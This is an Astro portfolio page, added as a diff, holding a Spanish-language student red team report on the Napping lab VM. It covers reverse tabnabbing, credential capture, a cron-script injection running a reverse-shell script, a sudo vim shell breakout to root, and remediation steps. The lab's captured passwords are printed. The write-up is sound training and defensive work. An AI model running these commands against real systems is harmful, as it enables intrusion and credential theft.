@@ -1,0 +1,311 @@
+---
+import Layout from "../../layouts/Layout.astro"
+import SectionContainer from "../../components/SectionContainer.astro"
+import TitleSection from "../../components/TitleSection.astro"
+import CodeIcon from "../../components/Icons/Code.astro"
+import Link from "../../components/Icons/Link.astro"
+
+// ── Íconos
+import Shield from "../../components/Icons/Shield.astro"
+import Bolt from "../../components/Icons/Bolt.astro"
+import Security from "../../components/Icons/Security.astro"
+import Books from "../../components/Icons/Books.astro"
+import Spy from "../../components/Icons/Spy.astro"
+import Settings from "../../components/Icons/Settings.astro"
+import Key from "../../components/Icons/Key.astro"
+import Tool from "../../components/Icons/Tool.astro"
+import Search from "../../components/Icons/Search.astro"
+import Goal from "../../components/Icons/Goal.astro"
+import Tareas from "../../components/Icons/Tareas.astro"
+
+const INFO_TAREA = {
+  titulo: "Actividad 11: Red Team Report - Napping 101",
+  fecha: "22 de Marzo, 2026",
+  descripcion: "Evaluación integral de seguridad ofensiva sobre la infraestructura corporativa 'Napping 101'. Documentación de la cadena de explotación desde el reconocimiento inicial hasta el compromiso absoluto del sistema operativo.",
+  pdf: "/pdfs/act11-Equipo5.pdf",
+  imagen1: "/projects/Imagen2Tarea11.png",
+  imagen2: "/projects/Imagen1Tarea11.png"
+}
+---
+
+<Layout
+  title={`Portafolio - ${INFO_TAREA.titulo}`}
+  description={INFO_TAREA.descripcion}
+>
+  <style>
+    :global(header) {
+      display: none !important;
+    }
+  </style>
+
+  <main class="px-4">
+    <SectionContainer class="py-16 md:py-20">
+
+      {/* --- ENCABEZADO --- */}
+      <TitleSection>
+        <CodeIcon class="size-8" />
+        {INFO_TAREA.titulo}
+      </TitleSection>
+
+      <p class="text-sm text-gray-500 dark:text-gray-400 mb-8 -mt-4 border-b border-gray-200 dark:border-gray-800 pb-4">
+        📅 Entregado el: {INFO_TAREA.fecha}
+      </p>
+
+      {/* Banner THREAT LEVEL */}
+      <div class="mb-10 flex items-center gap-3 px-4 py-3 rounded-lg bg-red-900/20 border border-red-500/30">
+        <Bolt class="size-5 text-red-400 shrink-0 animate-pulse" />
+        <p class="text-red-300 text-sm font-medium">
+          Nivel de Riesgo: CRÍTICO — Compromiso absoluto de la infraestructura y acceso Root obtenido.
+        </p>
+        <span class="ml-auto text-xs font-mono text-red-500/60 hidden sm:block">STATUS: COMPROMISED</span>
+      </div>
+
+      <div class="prose dark:prose-invert max-w-none text-gray-800 dark:text-gray-200 space-y-12">
+
+        {/* ── CONTEXTO Y ALCANCE ── */}
+        <div>
+          <p class="text-xs font-mono text-gray-500 mb-1">// RESUMEN EJECUTIVO Y ALCANCE</p>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">Contexto de la Evaluación</h3>
+          <p>
+            El ejercicio consistió en una evaluación de seguridad ofensiva bajo la modalidad de <strong>Red Team</strong>, cuyo objetivo rector fue auditar el nivel de exposición del servidor corporativo "Napping 101" mediante la simulación de vectores de ataque avanzados reales. 
+          </p>
+          <p class="mt-2">
+            <strong>Alcance de la prueba (Scope):</strong> Las actividades ofensivas se limitaron estrictamente a la infraestructura local virtualizada. El ataque se orquestó desde el nodo atacante (<code>192.168.56.102</code>) dirigido exclusivamente hacia el host objetivo (<code>192.168.56.101</code>).
+          </p>
+        </div>
+
+        {/* ── METODOLOGÍA Y FASES DEL ATAQUE ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Tool class="size-6 text-gray-400" />
+            Metodología y Fases del Ataque (PTES & OWASP)
+          </h3>
+          <p class="text-sm text-gray-400 mb-6">
+            La ejecución se alineó con el Estándar de Ejecución de Pruebas de Penetración (PTES), estructurando el ciclo de vida del ataque en 5 fases críticas:
+          </p>
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="flex gap-3 p-4 rounded-lg bg-gray-900/40 border border-gray-700/50 hover:border-blue-500/40 transition-colors">
+              <span class="text-blue-400 font-mono font-bold text-lg">01</span>
+              <div>
+                <p class="font-bold text-gray-200">Reconocimiento y Enumeración</p>
+                <p class="text-gray-400 text-xs mt-1">Uso de <code>netdiscover</code> (descubrimiento ARP) y <code>nmap</code> (puertos 22 y 80). <code>DirBuster</code> reveló <code>index.php</code>, <code>register.php</code> y una sesión <code>PHPSESSID</code> vulnerable sin flags de seguridad.</p>
+              </div>
+            </div>
+
+            <div class="flex gap-3 p-4 rounded-lg bg-gray-900/40 border border-gray-700/50 hover:border-orange-500/40 transition-colors">
+              <span class="text-orange-400 font-mono font-bold text-lg">02</span>
+              <div>
+                <p class="font-bold text-gray-200">Explotación (Client-Side)</p>
+                <p class="text-gray-400 text-xs mt-1">Explotación de <strong>Reverse Tabnabbing</strong>. Se engañó al administrador enviando un payload web que capturó credenciales válidas (<code>daniel/C@ughtm3napping123</code>) permitiendo el acceso inicial vía SSH.</p>
+              </div>
+            </div>
+
+            <div class="flex gap-3 p-4 rounded-lg bg-gray-900/40 border border-gray-700/50 hover:border-yellow-500/40 transition-colors">
+              <span class="text-yellow-400 font-mono font-bold text-lg">03</span>
+              <div>
+                <p class="font-bold text-gray-200">Movimiento Lateral</p>
+                <p class="text-gray-400 text-xs mt-1">Se detectó un <em>Cron Job</em> ejecutando <code>query.py</code> como el usuario <em>adrian</em>. Al tener permisos de escritura inseguros, se inyectó código para recibir una reverse shell en el puerto 8080.</p>
+              </div>
+            </div>
+
+            <div class="flex gap-3 p-4 rounded-lg bg-gray-900/40 border border-gray-700/50 hover:border-red-500/40 transition-colors">
+              <span class="text-red-400 font-mono font-bold text-lg">04</span>
+              <div>
+                <p class="font-bold text-gray-200">Escalada a Root y Post-Explotación</p>
+                <p class="text-gray-400 text-xs mt-1">Auditoría con <code>sudo -l</code> reveló permisos NOPASSWD para <code>/usr/bin/vim</code>. Se realizó un <em>shell breakout</em> obteniendo control total (root). En post-explotación se extrajeron credenciales de BD.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* ── EVIDENCIA TÉCNICA (TERMINALES) ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <CodeIcon class="size-6 text-gray-400" />
+            Evidencia Técnica: Explotación y Escalada
+          </h3>
+
+          {/* Terminal 1: Movimiento Lateral */}
+          <div class="mb-6 relative bg-[#0d1117] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#161b22] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">nano — /home/adrian/query.py</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <p class="text-xs text-gray-500 mb-2">// Inyección de comando en script de Cron Job para movimiento lateral</p>
+              <pre class="font-mono text-sm leading-relaxed">
+import requests
+import os
+now = datetime.now()
+r = requests.get('http://127.0.0.1/')
+<span class="text-yellow-300 font-bold">os.system('/usr/bin/bash /dev/shm/connection.sh')</span> <span class="text-gray-500"># Payload inyectado</span>
+if r.status_code == 200:
+    f = open("site_status.txt","a")
+              </pre>
+            </div>
+          </div>
+
+          {/* Terminal 2: Root Breakout */}
+          <div class="relative bg-[#0d1117] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-red-900/50">
+            <div class="bg-[#161b22] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-red-400 font-mono">bash — ROOT PRIVILEGE ESCALATION</span>
+            </div>
+            <div class="p-4 overflow-x-auto">
+              <pre class="font-mono text-sm leading-relaxed">
+<span class="text-gray-400">adrian@napping:~$</span> sudo -l
+User adrian may run the following commands on napping:
+    <span class="text-red-400">(root) NOPASSWD: /usr/bin/vim</span>
+
+<span class="text-gray-400">adrian@napping:~$</span> <span class="text-yellow-300">sudo /usr/bin/vim -c ':!/bin/sh'</span>
+<span class="text-gray-400">#</span> whoami
+<span class="text-red-500 font-bold">root</span>
+<span class="text-gray-400">#</span> cat /root/del_users.py | grep password
+<span class="text-purple-400">    password="P@sswr0d456",</span>
+<span class="text-gray-400">#</span> <span class="animate-pulse">_</span>
+              </pre>
+            </div>
+          </div>
+        </div>
+
+        {/* ── IMPACTO EMPRESARIAL (CIA) ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Goal class="size-6 text-red-400" />
+            Impacto Empresarial (Tríada CIA)
+          </h3>
+          <p class="text-sm text-gray-400 mb-4">
+            El compromiso integral de la infraestructura representa una vulneración absoluta a los tres pilares fundamentales de la seguridad de la información.
+          </p>
+          <div class="space-y-4">
+            <div class="p-4 border-l-4 border-red-500 bg-gray-900/30">
+              <h4 class="font-bold text-red-400 mb-1">Confidencialidad</h4>
+              <p class="text-sm text-gray-300">Exposición directa de datos sensibles. El ataque permitió interceptar contraseñas de administradores en texto claro y la extracción de credenciales <em>hardcodeadas</em> conectadas a la base de datos MySQL corporativa.</p>
+            </div>
+            <div class="p-4 border-l-4 border-yellow-500 bg-gray-900/30">
+              <h4 class="font-bold text-yellow-400 mb-1">Integridad</h4>
+              <p class="text-sm text-gray-300">Alteración de procesos automatizados. Al obtener privilegios máximos (root), un atacante tiene la capacidad de modificar registros de auditoría, instalar puertas traseras y corromper registros de la base de datos a voluntad.</p>
+            </div>
+            <div class="p-4 border-l-4 border-orange-500 bg-gray-900/30">
+              <h4 class="font-bold text-orange-400 mb-1">Disponibilidad</h4>
+              <p class="text-sm text-gray-300">Riesgo inminente y catastrófico. Durante la post-explotación se localizaron scripts administrativos preparados para ejecutar sentencias destructivas masivas (<code class="text-xs">TRUNCATE TABLE users</code>), lo que resultaría en una pérdida irrecuperable de datos.</p>
+            </div>
+          </div>
+        </div>
+
+        {/* ── VULNERABILIDADES ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Security class="size-6 text-blue-400" />
+            Matriz de Vulnerabilidades Descubiertas
+          </h3>
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div class="p-4 rounded-lg border border-red-500/40 bg-gray-900/60 transition-all hover:scale-[1.02]">
+              <div class="flex items-center gap-2 mb-2">
+                <Spy class="size-5 text-red-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-sm">Reverse Tabnabbing (Web)</p>
+              </div>
+              <p class="text-gray-400 text-xs">Ataque *Client-Side* por falta de restricción en pestañas. Permitió phishing dirigido.</p>
+            </div>
+            <div class="p-4 rounded-lg border border-orange-500/40 bg-gray-900/60 transition-all hover:scale-[1.02]">
+              <div class="flex items-center gap-2 mb-2">
+                <Settings class="size-5 text-orange-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-sm">Permisos Inseguros (Cron)</p>
+              </div>
+              <p class="text-gray-400 text-xs">Script `query.py` automático modificable por terceros. Facilitó RCE y movimiento lateral.</p>
+            </div>
+            <div class="p-4 rounded-lg border border-red-600/60 bg-gray-900/60 transition-all hover:scale-[1.02]">
+              <div class="flex items-center gap-2 mb-2">
+                <Bolt class="size-5 text-red-500 shrink-0" />
+                <p class="font-bold text-gray-200 text-sm">Sudoers Misconfiguration</p>
+              </div>
+              <p class="text-gray-400 text-xs">Uso de `vim` como root sin clave (NOPASSWD). Causó el compromiso total del servidor.</p>
+            </div>
+            <div class="p-4 rounded-lg border border-yellow-500/40 bg-gray-900/60 transition-all hover:scale-[1.02]">
+              <div class="flex items-center gap-2 mb-2">
+                <Key class="size-5 text-yellow-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-sm">Hardcoded Secrets (MySQL)</p>
+              </div>
+              <p class="text-gray-400 text-xs">Credenciales de base de datos expuestas en código fuente del administrador.</p>
+            </div>
+          </div>
+        </div>
+
+        {/* ── ROADMAP DE REMEDIACIÓN ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Shield class="size-6 text-green-400" />
+            Roadmap Estratégico de Remediación
+          </h3>
+          <div class="space-y-3 bg-gray-900/40 p-6 rounded-xl border border-green-900/30">
+            <div class="flex gap-4 items-start">
+              <span class="text-green-400 font-mono font-bold mt-0.5 whitespace-nowrap">[CORTO PLAZO]</span>
+              <p class="text-gray-300 text-sm">Retirar la directiva <code>NOPASSWD</code> para <code>vim</code> en <code>/etc/sudoers</code> (usar <code>sudoedit</code>). Eliminar credenciales hardcodeadas en <code>del_users.py</code> y aplicar <code>chmod 644</code> a <code>query.py</code>.</p>
+            </div>
+            <div class="flex gap-4 items-start">
+              <span class="text-yellow-400 font-mono font-bold mt-0.5 whitespace-nowrap">[MEDIO PLAZO]</span>
+              <p class="text-gray-300 text-sm">Implementar el atributo <code>rel="noopener noreferrer"</code> en toda la aplicación web y configurar las flags <code>HttpOnly</code> y <code>Secure</code> en las cookies de sesión.</p>
+            </div>
+            <div class="flex gap-4 items-start">
+              <span class="text-blue-400 font-mono font-bold mt-0.5 whitespace-nowrap">[LARGO PLAZO]</span>
+              <p class="text-gray-300 text-sm">Transicionar hacia una bóveda criptográfica (Vault) para la gestión centralizada de secretos y establecer un programa de monitoreo continuo de vulnerabilidades.</p>
+            </div>
+          </div>
+        </div>
+
+        {/* ── EVIDENCIA VISUAL ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80">Archivos Multimedia</h3>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <figure class="relative transition-all duration-300 hover:scale-[1.01]">
+              <img 
+                class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800" 
+                src={INFO_TAREA.imagen1} 
+                alt="Diagrama de Metodología y Cadena de Ataque" 
+              />
+              <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
+                Figura 1: Representación de la metodología ofensiva (PTES).
+              </figcaption>
+            </figure>
+            
+            <figure class="relative transition-all duration-300 hover:scale-[1.01]">
+              <img 
+                class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800" 
+                src={INFO_TAREA.imagen2} 
+                alt="Evidencia del Servidor Comprometido" 
+              />
+              <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
+                Figura 2: Capturas del entorno Napping 101 durante el pentesting.
+              </figcaption>
+            </figure>
+          </div>
+        </div>
+
+      </div>
+
+      {/* --- ZONA DE DESCARGA Y NAVEGACIÓN --- */}
+      <div class="mt-16 pt-8 border-t border-gray-200 dark:border-gray-800 flex flex-col items-center gap-6">
+        <a 
+          href={INFO_TAREA.pdf} 
+          download="act11-Equipo5.pdf" 
+          class="flex items-center gap-2 px-8 py-3 text-base font-bold text-white transition-all bg-blue-600 rounded-full hover:bg-blue-700 hover:shadow-lg hover:shadow-blue-500/30"
+        >
+          <Link class="size-5" />
+          Descargar PDF de la Tarea
+        </a>
+        <a 
+          href="/#tareas" 
+          class="text-gray-500 hover:text-blue-500 hover:underline flex items-center gap-2 text-sm font-medium transition mt-4"
+        >
+          ← Regresar a la lista de tareas
+        </a>
+      </div>
+
+    </SectionContainer>
+  </main>
+</Layout>
